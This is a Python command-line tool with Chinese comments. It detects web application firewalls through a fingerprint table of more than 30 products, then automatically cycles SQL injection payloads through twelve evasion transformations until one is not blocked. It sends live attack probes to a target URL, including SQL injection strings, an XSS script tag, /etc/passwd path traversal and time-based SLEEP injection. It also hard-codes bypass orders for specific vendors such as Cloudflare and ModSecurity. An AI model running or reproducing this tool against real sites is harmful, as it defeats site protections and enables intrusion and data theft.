#!/usr/bin/env python3
"""waf_bypass — 自主 WAF 检测 + 绕过引擎 v2（学习 Awesome-WAF + wafw00f 后重写）。

能力:
  1. 30+ WAF 指纹库（国产 360/安全狗/云锁/云盾/腾讯 + 国际 Cloudflare/ModSecurity 等）
  2. 12 层绕过技术（大小写/编码/注释/空白/等价替换/关键词拆解）
  3. WAF 产品特定绕过策略
  4. 自动迭代: 检测 WAF → 逐层变体 → 找到穿透

绕过技术库（学自 Awesome-WAF Evasion Techniques）:
  L1  大小写混合: sELecT / AnD
  L2  URL 编码: %20 %27
  L3  双重编码: %2527
  L4  注释符: /**/ 替换空格
  L5  内联注释: /*!50000SELECT*/
  L6  等价替换: AND→&&, OR→||, SLEEP→BENCHMARK
  L7  空白替换: %09 %0a %0b %0c %0d +
  L8  关键词拆解: union→uni/**/on
  L9  hex 编码: 引号字符串→0x... / unhex()
  L10 conv 等价: substr→lpad→conv(11,10,36)
  L11 无引号注入: 0x61 替代 'a'
  L12 参数污染 HPP

用法:
    python3 waf_bypass.py -u "http://target/user?id=1" --payload "1 AND 1=1"
    python3 waf_bypass.py -u "http://target/user?id=1" --detect-only
"""

import argparse
import json
import random
import re
import sys
import time
import urllib.request
import urllib.parse
from pathlib import Path
from typing import Dict, List, Tuple

# ==================== WAF 指纹库（学自 wafw00f + Awesome-WAF） ====================
# (匹配位置, 正则, WAF名)
WAF_DB = [
    # 国产
    ("header", r"Server:\s*qianxin\-waf", "奇安信 WAF"),
    ("header", r"WZWS-Ray:", "360 网站卫士"),
    ("header", r"X-Powered-By-360WZB", "360 WAF"),
    ("header", r"Server:\s*YUNDUN", "阿里云盾"),
    ("header", r"X-Cache:\s*YUNDUN", "阿里云盾"),
    ("cookie", r"yd_cookie=", "阿里云盾"),
    ("header", r"X-Powered-by-Anquanbao", "安全宝"),
    ("body", r"aqb_cc/error/", "安全宝"),
    ("body", r"wzws\-waf\-cgi/", "360 WAF"),
    ("body", r"wangshan\.360\.cn", "360 WAF"),
    ("body", r"waf\.tencent\-?cloud\.com", "腾讯云 WAF"),
    ("body", r"安全狗|safedog", "安全狗 SafeDog"),
    ("body", r"云锁|yunsuo", "云锁 Yunsuo"),
    ("body", r"yunsuo\.cn", "云锁 Yunsuo"),
    ("body", r"知道创宇|seebug|ksyun", "知道创宇 WAF"),
    ("body", r"百度云加速|yunjiasu", "百度云加速"),
    ("body", r"加速乐|jiasule", "加速乐 Jiasule"),
    ("body", r"AnYu.*green channel", "安域 Anyu"),
    ("body", r"拦截|已被拦截|访问被拒绝|请求被阻止", "国产 WAF(通用)"),
    # 国际
    ("header", r"CF-RAY:", "Cloudflare"),
    ("header", r"Server:\s*cloudflare", "Cloudflare"),
    ("body", r"cf-chl|challenge-platform", "Cloudflare"),
    ("header", r"X-Sucuri-ID:", "Sucuri"),
    ("header", r"X-Sucuri-Cache:", "Sucuri"),
    ("header", r"Server:\s*sucuri", "Sucuri"),
    ("header", r"X-Akamai-Transformed:", "Akamai"),
    ("header", r"X-Akamai-Request-ID", "Akamai"),
    ("header", r"X-CDN:.*Incapsula", "Imperva Incapsula"),
    ("header", r"X-Iinfo:", "Imperva Incapsula"),
    ("body", r"incapsula|imperva", "Imperva Incapsula"),
    ("header", r"Mod_Security", "ModSecurity"),
    ("body", r"mod_security|modsecurity", "ModSecurity"),
    ("header", r"X-Powered-By:.*(?:WAF|barracuda)", "Barracuda WAF"),
    ("header", r"Server:\s*BigIP|X-Cnection:.*close", "F5 BIG-IP"),
    ("body", r"F5 Networks|BIG-IP", "F5 BIG-IP"),
    ("header", r"X-WAF:", "Generic WAF"),
    ("header", r"X-ASEN:", "AE Secure"),
    ("body", r"aeSecure-code", "AE Secure"),
    ("header", r"AL-SESS|AL-LB", "Airlock"),
    ("body", r"Server detected a syntax error", "Airlock"),
    ("header", r"Server:\s*ArvanCloud", "ArvanCloud"),
    ("body", r"Blocked by.*Armor|Armor support ticket", "Armor Defense"),
    ("header", r"ASPA-WAF", "ASPA"),
    ("body", r"x-dotdefender", "dotDefender"),
    ("body", r"网站安全狗|360主机卫士|护卫神", "国产主机卫士"),
]


def _collect_fingerprint_sources(base_url: str, param: str, probes: List[str]) -> Tuple[int, str, Dict]:
    """发恶意探测，返回最可疑的 (status, body, headers)。"""
    best = (0, "", {})
    for probe in probes:
        url = mutate_url(base_url, param, probe)
        s, b, h = http_get_raw(url)
        # 收集所有源（合并 headers + body 用于指纹匹配）
        if s in (403, 406, 429, 493) or "blocked" in b.lower() or "denied" in b.lower():
            return s, b, h
        if s != 0:
            best = (s, b, h)
    return best


def detect_waf(base_url: str, param: str) -> Dict:
    """WAF 检测：恶意 payload 探测 + 30+ 指纹库匹配。"""
    probes = ["' OR '1'='1", "1 AND 1=1", "<script>alert(1)</script>",
              "../../../etc/passwd", "1;SELECT SLEEP(5)", "union select 1,2,3"]
    # 正常基线
    s_base, b_base, h_base = http_get_raw(base_url)

    blocked = []
    matched_wafs = set()
    for probe in probes:
        url = mutate_url(base_url, param, probe)
        s, b, h = http_get_raw(url)
        # 拦截判定: 状态码 / 缩短响应 / 指纹
        is_block = False
        reason = ""
        if s in (403, 406, 429, 493):
            is_block, reason = True, f"status={s}"
        elif s == s_base and len(b) < max(len(b_base) * 0.3, 100):
            is_block, reason = True, f"短响应({len(b)}B)"
        # 指纹匹配（所有源）
        blob = b + "\n" + str(h) + "\n" + "\n".join(f"{k}: {v}" for k, v in h.items())
        for loc, sig, name in WAF_DB:
            if re.search(sig, blob, re.I):
                matched_wafs.add(name)
        if is_block:
            blocked.append({"probe": probe, "reason": reason})

    return {
        "waf_detected": len(blocked) >= 2 or bool(matched_wafs),
        "blocked_count": len(blocked),
        "total_probes": len(probes),
        "waf_name": " / ".join(sorted(matched_wafs)) or ("Unknown-WAF" if len(blocked) >= 2 else ""),
        "blocked": blocked,
        "matched_wafs": sorted(matched_wafs),
    }


# ==================== 12 层绕过技术（学自 Awesome-WAF） ====================
def build_variants(payload: str) -> List[Dict]:
    """生成 payload 的 12 层绕过变体。"""
    variants = []

    # L1 大小写混合
    variants.append({"name": "L1-upper", "payload": payload.upper()})
    variants.append({"name": "L1-toggle", "payload": re.sub(
        r"(?i)(select|union|and|or|sleep|from|where|group|having)",
        lambda m: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(m.group())),
        payload)})

    # L2 URL 编码（关键字符）
    variants.append({"name": "L2-url", "payload": urllib.parse.quote(payload)})

    # L3 双重编码
    variants.append({"name": "L3-double", "payload": urllib.parse.quote(urllib.parse.quote(payload))})

    # L4 注释符替换空格
    variants.append({"name": "L4-comment", "payload": payload.replace(" ", "/**/")})

    # L5 内联注释（MySQL 版本注释）
    variants.append({"name": "L5-inline", "payload": re.sub(
        r"(?i)\b(select|union|and|or|sleep|from|where)\b",
        lambda m: f"/*!50000{m.group().upper()}*/", payload)})

    # L6 等价替换 AND→&& OR→|| SLEEP→BENCHMARK
    l6 = payload.lower()
    l6 = l6.replace(" and ", " && ").replace(" or ", " || ")
    l6 = l6.replace("sleep(", "benchmark(10000000,")
    variants.append({"name": "L6-equiv", "payload": l6})

    # L7 空白替换
    for sep in ["%09", "%0a", "%0b", "%0c", "%0d", "+"]:
        variants.append({"name": f"L7-space-{sep}", "payload": payload.replace(" ", sep)})

    # L8 关键词拆解 union→uni/**/on
    l8 = re.sub(r"(?i)(select|union|and|or|from|where)",
                lambda m: m.group()[:len(m.group())//2] + "/**/" + m.group()[len(m.group())//2:],
                payload)
    variants.append({"name": "L8-split", "payload": l8})

    # L9 hex 编码引号字符串
    l9 = re.sub(r"'([^']+)'", lambda m: "0x" + m.group(1).encode().hex(), payload)
    variants.append({"name": "L9-hex", "payload": l9})

    # L10 conv 等价 substr→lpad
    l10 = payload.lower().replace("substr(", "lpad(").replace("substring(", "lpad(")
    variants.append({"name": "L10-conv", "payload": l10})

    # L11 无引号注入（0x61 替代 'a'）
    l11 = re.sub(r"'([^']+)'", lambda m: "0x" + m.group(1).encode().hex(), payload)
    variants.append({"name": "L11-noquote", "payload": l11})

    # L12 参数污染（HPP 标记，由调用方处理同参数双值）
    variants.append({"name": "L12-hpp", "payload": payload, "hpp": True})

    return variants


def bypass_waf(base_url: str, param: str, payload: str, waf_name: str = "") -> Dict:
    """绕过 WAF：12 层变体逐层尝试，找到穿透的。"""
    s_base, b_base, _ = http_get_raw(base_url)
    base_len = len(b_base)

    # WAF 产品特定绕过优先顺序
    waf_specific_order = []
    if "360" in waf_name or "奇安信" in waf_name:
        waf_specific_order = ["L4-comment", "L8-split", "L6-equiv", "L7-space-%09"]
    elif "云锁" in waf_name or "安全狗" in waf_name:
        waf_specific_order = ["L7-space-%0a", "L8-split", "L9-hex", "L6-equiv"]
    elif "cloudflare" in waf_name.lower():
        waf_specific_order = ["L4-comment", "L6-equiv", "L8-split", "L9-hex"]
    elif "modsecurity" in waf_name.lower():
        waf_specific_order = ["L7-space-%09", "L8-split", "L6-equiv", "L1-toggle"]
    elif "aliyun" in waf_name or "云盾" in waf_name:
        waf_specific_order = ["L8-split", "L6-equiv", "L7-space-%0b", "L9-hex"]

    variants = build_variants(payload)
    # 产品特定优先
    if waf_specific_order:
        variants.sort(key=lambda v: (v["name"] not in waf_specific_order,
                                     waf_specific_order.index(v["name"]) if v["name"] in waf_specific_order else 99))

    attempts = []
    for v in variants:
        # HPP 变体特殊处理
        if v.get("hpp"):
            # 同参数双值: ?id=1&id=PAYLOAD
            url = base_url + "&" + param + "=" + urllib.parse.quote(payload)
        else:
            url = mutate_url(base_url, param, v["payload"])
        s, b, _ = http_get_raw(url)
        # 拦截判定: 状态码 或 响应含拦截特征词
        block_words = ["403 forbidden", "access denied", "intercepted", "blocked", "拦截", "waf",
                       "sorry", "rejected", "forbidden"]
        is_block = s in (403, 406, 429, 493) or any(w in b.lower() for w in block_words)
        attempts.append({"layer": v["name"], "blocked": is_block, "status": s, "body": b[:60]})
        if not is_block and s in (200, 201, 302):
            return {"bypassed": True, "layer": v["name"], "payload": v["payload"],
                    "url": url, "status": s, "attempts": attempts}

    return {"bypassed": False, "attempts": attempts}


def http_get_raw(url: str, timeout: float = 10.0) -> Tuple[int, str, Dict]:
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(4096).decode("utf-8", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read(2048).decode("utf-8", "replace")
        except Exception:
            body = ""
        return e.code, body, dict(e.headers)
    except Exception:
        return 0, "", {}


def mutate_url(base_url: str, param: str, value: str) -> str:
    # 保留绕过字符（/ * % 空格 + 引号）不编码，只编码危险分隔符
    safe = value.replace(" ", "%20").replace("'", "%27")
    if "?" in base_url:
        prefix, query = base_url.split("?", 1)
        params = query.split("&")
        new_params = []
        replaced = False
        for p in params:
            if p.startswith(param + "="):
                new_params.append(f"{param}={safe}")
                replaced = True
            else:
                new_params.append(p)
        if not replaced:
            new_params.append(f"{param}={safe}")
        return prefix + "?" + "&".join(new_params)
    return base_url + "?" + param + "=" + safe


def main():
    ap = argparse.ArgumentParser(description="自主 WAF 检测 + 12 层绕过引擎")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--param", default="")
    ap.add_argument("--payload", default="1 AND 1=1")
    ap.add_argument("--detect-only", action="store_true")
    args = ap.parse_args()

    param = args.param
    if not param:
        from urllib.parse import urlparse, parse_qs
        q = parse_qs(urlparse(args.url).query)
        param = list(q.keys())[0] if q else "id"

    print(f"[waf-bypass v2] {args.url}")
    waf = detect_waf(args.url, param)
    if waf["waf_detected"]:
        print(f"  [!] WAF: {waf['waf_name']} ({waf['blocked_count']}/{waf['total_probes']} 被拦)")
    else:
        print(f"  [-] 未检测到 WAF（{waf['blocked_count']}/{waf['total_probes']} 被拦）")

    if args.detect_only:
        return

    print(f"\n[waf-bypass] 绕过: {args.payload}")
    result = bypass_waf(args.url, param, args.payload, waf["waf_name"])
    if result["bypassed"]:
        print(f"  [+] 绕过成功 ({result['layer']}): {result['payload'][:80]}")
        print(f"      URL: {result['url'][:100]}")
        print(f"      状态: {result['status']}")
    else:
        print(f"  [-] 全部 {len(result['attempts'])} 层被拦截")
        for a in result["attempts"]:
            print(f"      {a['layer']}: blocked={a['blocked']} status={a['status']}")

    try:
        Path("/tmp/waf_bypass_result.json").write_text(json.dumps(result, ensure_ascii=False, indent=2, default=str))
    except Exception:
        pass


if __name__ == "__main__":
    main()
